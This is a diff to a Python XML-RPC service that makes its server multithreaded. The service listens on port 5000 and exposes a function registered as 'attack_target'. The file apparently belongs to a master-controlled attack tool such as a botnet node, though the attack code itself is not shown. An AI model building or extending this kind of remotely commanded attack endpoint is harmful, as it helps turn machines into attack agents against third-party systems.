@@ -4,10 +4,15 @@ import socket
 import platform
 import xmlrpc.client
 from xmlrpc.server import SimpleXMLRPCServer, SimpleXMLRPCRequestHandler
+from socketserver import ThreadingMixIn
 
 
 def getIpAddress():
     return socket.gethostbyname(socket.gethostname())
+
+
+class SimpleThreadXMLRPCServer(ThreadingMixIn, SimpleXMLRPCServer):
+    pass
 
 
 class RequestHandler(SimpleXMLRPCRequestHandler):
@@ -15,7 +20,7 @@ class RequestHandler(SimpleXMLRPCRequestHandler):
 
 
 def listenMaster(ip_master):
-    server = SimpleXMLRPCServer(
+    server = SimpleThreadXMLRPCServer(
         (getIpAddress(), 5000), requestHandler=RequestHandler, allow_none=True)
     server.register_introspection_functions()
     server.register_function(attackTarget, "attack_target")
